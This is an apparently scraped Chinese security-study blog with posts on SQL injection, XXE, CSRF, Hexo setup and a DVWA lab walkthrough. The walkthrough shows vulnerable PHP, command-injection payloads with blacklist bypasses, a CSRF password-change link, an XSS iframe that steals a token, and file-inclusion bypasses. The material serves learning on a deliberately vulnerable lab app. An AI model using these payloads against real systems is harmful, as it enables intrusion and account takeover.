$files;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">$d=$_GET[&#x27;d&#x27;];   //没有防范</span><br><span class="line">print_r(my_dir($d));</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>传入参数d&#x3D;pikachu，就会遍历目录下的所有文件，会出现..\打印上级目录，这样会出现网站源码结构泄露</p>
+<h2 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h2><p>sql注入就是在数据交互中，前端数据传到后台时没有做严格的判断，导致传进来的数据被拼接到sql语句中，被当作sql语句的一部分进行执行</p>
+<p><img src="/img/203.png"></p>
+<h3 id="注入时信息收集"><a href="#注入时信息收集" class="headerlink" title="注入时信息收集"></a>注入时信息收集</h3><p><img src="/img/204.png"><br>mysql的版本5.0以上才有information_schema数据库</p>
+<ul>
+<li>信息收集：<br>查询数据库 version()<br>数据库名字 databaase()<br>数据库用户 user()<br>操作系统 @@version_compile_os</li>
+</ul>
+<p>跨库查询：目标网站的同一个服务器中如果存在一个网站的数据库是使用root权限连接的，且存在sql注入漏洞，就会有被跨库攻击的风险。数据库名存放在information_schema.schemata表中的schema_name字段，查询方式和查表名一致</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/XXE.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/XXE.html" itemprop="url">XXE</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-07-29T11:45:10+08:00">
+                2023-07-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>XXE就是XML外部实体注入，当允许引用外部实体时， XML数据在传输中有可能会被不法分子被修改，如果服务器执行被恶意插入的代码，就可以实现攻击的目的攻击者可以通过构造恶意内容，就可能导致任意文件读取，系统命令执行，内网端口探测，攻击内网网站等危害</p>
+<h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>用来进行数据的传输和存储，有标签构成<br>XML和HTML的区别：XML被设计用来传输和存储数据，HTML被设计用来显示数据<br><strong>xml实体</strong></p>
+<p><strong>基本结构</strong><br>XML声明，DTD部分，XML部分</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=’1.0’?&gt;	   // 声明XML解析器版本 </span><br><span class="line"> </span><br><span class="line">// 运用实体定义变量的写法 </span><br><span class="line">// 即声明一个name变量，值为john</span><br><span class="line">&lt;!DOCTYPE person[         </span><br><span class="line">&lt;!ENTITY name “john”&gt;      </span><br><span class="line">]&gt;				</span><br><span class="line"> </span><br><span class="line">// 引用一般实体的写法，格式为&quot;&amp;实体名称;&quot;</span><br><span class="line">&lt;person&gt;			      </span><br><span class="line">&lt;name&gt;&amp;name;&lt;/name&gt;		   		</span><br><span class="line">&lt;age&gt;20&lt;/age&gt;</span><br><span class="line">&lt;/person&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA.html" itemprop="url">hexo+github博客搭建</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-07-08T19:41:05+08:00">
+                2023-07-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><strong>1、git、nodejs安装</strong><br>都是一直下一步,node安装稳定版,npm在弄得安装时自动安装<br><a target="_blank" rel="noopener" href="https://git-scm.com/downloads">git</a><br><a target="_blank" rel="noopener" href="https://nodejs.org/zh-cn">Nodejs</a><br>git -v 、node -v、npm -v</p>
+<p><strong>2、Hexo框架安装</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo -g //hexo命令安装，hexo version</span><br><span class="line">hexo init blog //初始化blog，会在当前目录创建名为blog的博客文件夹</span><br><span class="line">npm install //安装依赖</span><br></pre></td></tr></table></figure>
+<p>以上都做完，博客就在本地搭建成功了</p>
+<p><strong>3、部署到GitHub</strong><br>创建一个新仓库<br><img src="/img/196.png"><br>Repository name: yzklov.github.io  &#x2F;&#x2F;用户名.github.io,固定格式<br>选择public，创建仓库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;yzklov&quot; //github用户名</span><br><span class="line">git config --global user.email &quot;1610114502@qq.com&quot; //创建github的邮箱</span><br><span class="line">npm install hexo-deployer-git --save //安装插件</span><br></pre></td></tr></table></figure>
+<p>创建ssh密钥<br><code>ssh-keygen -t rsa </code>   &#x2F;&#x2F;完成以后按直接三下回车跳过<br>将.ssh文件里的id_rsa.pub文件里的全部内容复制下来，在github-&gt;setting里创建密钥，名字是填github用户名，然后把内容复制进去<br>修改_config.yml文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: &#x27;git&#x27;</span><br><span class="line">  repo: &#x27;git@github.com:yzklov/yzklov.github.io.git&#x27;</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure>
+<p>可以上传到github了</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/CSRF.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/CSRF.html" itemprop="url">CSRF</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-06-01T15:44:07+08:00">
+                2023-06-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="什么是CSRF？"><a href="#什么是CSRF？" class="headerlink" title="什么是CSRF？"></a>什么是CSRF？</h2><blockquote>
+<p>跨站请求伪造，冒用Cookie中的信息，发起请求攻击。<br>CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。</p>
+</blockquote>
+<h2 id="CSRF攻击过程"><a href="#CSRF攻击过程" class="headerlink" title="CSRF攻击过程"></a>CSRF攻击过程</h2><p>1、当用户已经登录成功了一个网站<br>2、然后通过被诱导进了第三方网站「钓鱼网站」<br>3、跳转过去了自动提交表单，冒用受害者信息<br>4、后台则正常走逻辑将用户提交的表单信息进行处理</p>
+<h2 id="CSRF的特点"><a href="#CSRF的特点" class="headerlink" title="CSRF的特点"></a>CSRF的特点</h2><p>攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。 攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据，整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。 跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。 CSRF通常是跨域的，因为外域通常更容易被攻击者掌控。但是如果本域下有容易被利用的功能，比如可以发图和链接的论坛和评论区，攻击可以直接在本域下进行，而且这种攻击更加危险。</p>
+<h2 id="防护策略"><a href="#防护策略" class="headerlink" title="防护策略"></a>防护策略</h2><p>CSRF通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对CSRF的防护能力来提升安全性。</p>
+<p><strong>Token：存在本地local strage中的加密数据</strong><br>token是一个比较有效的CSRF防护方法，只要页面没有XSS漏洞泄露Token，那么接口的CSRF攻击就无法成功，也是现在主流的解决方案。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/dvwa.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/dvwa.html" itemprop="url">dvwa</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-05-31T23:05:45+08:00">
+                2023-05-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="暴力破解-Brute-Force"><a href="#暴力破解-Brute-Force" class="headerlink" title="暴力破解(Brute Force)"></a>暴力破解(Brute Force)</h2><p>暴力破解或称为穷举法，是一种针对于密码的破译方法，即将密码进行逐个推算直到找出真正的密码为止<br><img src="/./img/163.png"></p>
+<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line"></span><br><span class="line">    // 确定操作系统并执行ping命令</span><br><span class="line">    if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">        // 判断函数的返回值有没有Windows</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // *nix</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<ul>
+<li>php_uname()会返回操作系统的一些相关信息，其中就包括操作系统的名称，之后带入到stristr()函数查找windows NT，如果有就会返回字符串的剩余部分（从匹配点）。如果未找到所搜索的字符串，则返回 FALSE</li>
+<li>shell_exec() — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回<br>可以直接进行命令注入：<br><code>127.0.0.1&amp;ipconfig</code><br><code>127.0.0.1&amp;net user</code><br><code>127.0.0.1&amp;systeminfo</code><br><code>127.0.0.1&amp;dir</code><br>当然也可以使用管道符|,|的输出只有后面指令的，因为|的含义是将前面命令的标准输出作为后面命令的标准输入</li>
+</ul>
+<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Set blacklist</span><br><span class="line">    $substitutions = array(</span><br><span class="line">        &#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // Remove any of the charactars in the array (blacklist).</span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">        // Windows</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // *nix</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>array_keys() 函数返回包含数组中所有键名的一个新数组<br>eg:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$substitutions = array(&#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;,&#x27;;&#x27;  =&gt; &#x27;&#x27;,);</span><br><span class="line">print_r(array_keys( $substitutions ));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+输出：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; &amp;&amp;</span><br><span class="line">    [1] =&gt; ;</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
+<li>str_replace():array_keys( $substitutions )规定查找的字符；$substitutions是规定查找到后要替换成的值；$target是目标字符串<br>下面的代码后low一样，所以可以使用&amp;来拼接也可以这样绕过：<code>127.0.0.1 &amp;;&amp; ipconfig</code></li>
+</ul>
+<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$substitutions = array(</span><br><span class="line">        &#x27;&amp;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;| &#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;-&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;$&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;(&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;)&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;`&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;||&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    ); </span><br></pre></td></tr></table></figure>
+<p>和medium的差别就是黑名单过滤变多了，其中最后一个存在空格，所以可以使用<code>127.0.0.1|| net user</code></p>
+<h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line">    $target = stripslashes( $target );</span><br><span class="line"></span><br><span class="line">    // 将ip分成4个八位字节</span><br><span class="line">    $octet = explode( &quot;.&quot;, $target );</span><br><span class="line"></span><br><span class="line">    // Check IF each octet is an integer</span><br><span class="line">    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123;</span><br><span class="line">        // If all 4 octets are int&#x27;s put the IP back together.</span><br><span class="line">        $target = $octet[0] . &#x27;.&#x27; . $octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3];</span><br><span class="line"></span><br><span class="line">        // Determine OS and execute the ping command.</span><br><span class="line">        if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">            // Windows</span><br><span class="line">            $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // *nix</span><br><span class="line">            $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Feedback for the end user</span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Ops. Let the user name theres a mistake</span><br><span class="line">        echo &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>查看代码，impossible级别的代码加入了Anti-CSRF:token，同时对参数ip进行了严格限制，只有像“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。<br><strong>源码分析</strong><br>先checkToken，检查了token，然后把输入的ip&#x3D;()删除反斜杠，接着用explode()函数把传入的命令以.为分界分成4个部分，然后if语句中使用is_numeric()函数来验证每个部分是不是数字，sizeof()函数检查是不是四个部分，如果以上都满足就将四个部分拼接在一起进行命令执行，否则报错。最后生成生成反csrf令牌。</p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p>这是一个修改密码的页面，修改试试，修改成功，并且是以get方式传输的<br><img src="/./img/164.png"><br>从有源码中，可以知道，服务器收到修改密码的请求后，会检查参数$pass_new与$pass_conf是否相同，如果相同就会修改密码，并且没有任何的防csrf机制<br>我们就直接在URL中修改内容:<br><code>http://www.dvwa.test/vulnerabilities/csrf/?password_new=abcd&amp;password_conf=abcd&amp;Change=Change#</code><br>(必须使用同一个浏览器，因为在访问页面时通常存在cookie认证，否则即使点击了恶意链接也没用)<br>密码有效<br><img src="/./img/165.png"><br>所以在这种情况下我们可以使用短链接包装一下上面的链接诱骗受害者点击，然后密码就会被自动修改</p>
+<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>直接修改url，提示请求错误<br><img src="/./img/166.png"><br>尝试修改密码，抓包发现referer<br><img src="/./img/167.png"><br>查看源码，medium级别中通过Referer检查来源，要求Referer中的来源方和host一致才能通过，所以我们需要添加并修改Referer<br><img src="/./img/168.png"><br><img src="/./img/170.png"></p>
+<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><p>加入了Anti-CSRF token来防范CSRF攻击，即随机生成了一个token，正确时才能通过。<br>如果要绕过这个机制，就要获取token，然后利用受害者的cookie去修改密码<br>这里需要XSS+CSRF来共同完成：<br>找到DVWA中的XSS(stored)模块，在Low中抓包投放js代码<br><code>&lt;iframe src=&quot;../csrf/&quot; onload=alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)&gt;&lt;/iframe&gt;</code><br>然后就出现了这样一个数据信息<br><img src="/./img/171.png"><br>再点击DVWA Security后弹出token<br><img src="/./img/172.png"><br>构造语句后将这个token添加上，然后回车<br><img src="/./img/173.png"><br><img src="/./img/174.png"></p>
+<h3 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h3><p>可以看到，Impossible级别的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。 </p>
+<h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><h3 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h3><p>没有任何保护措施，可以直接在地址栏中进行文件名传参<br><code>?page=D:/phpStudy/PHPTutorial/WWW/phpinfo.php</code><br><img src="/./img/175.png"></p>
+<h3 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &#x27;page&#x27; ];</span><br><span class="line"></span><br><span class="line">// Input validation验证</span><br><span class="line">$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );</span><br><span class="line">$file = str_replace( array( &quot;../&quot;, &quot;..\\&quot; ), &quot;&quot;, $file );</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>对于http的替换我们可以采用双写绕过，而下面的斜杠主要是针对相对路径文件存储路径，但如果我们采用绝对路径上述过滤也可以成功绕过</p>
+<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &#x27;page&#x27; ];</span><br><span class="line"></span><br><span class="line">// Input validation</span><br><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123;</span><br><span class="line">    // This isn&#x27;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>fnmatch() 函数：根据指定的模式来匹配文件名或字符串<br>采用file类型地址，那么我们就把我们要输入的地址进行修改<br><code>?page=file:///D:/phpStudy/PHPTutorial/WWW/phpinfo.php</code></li>
+</ul>
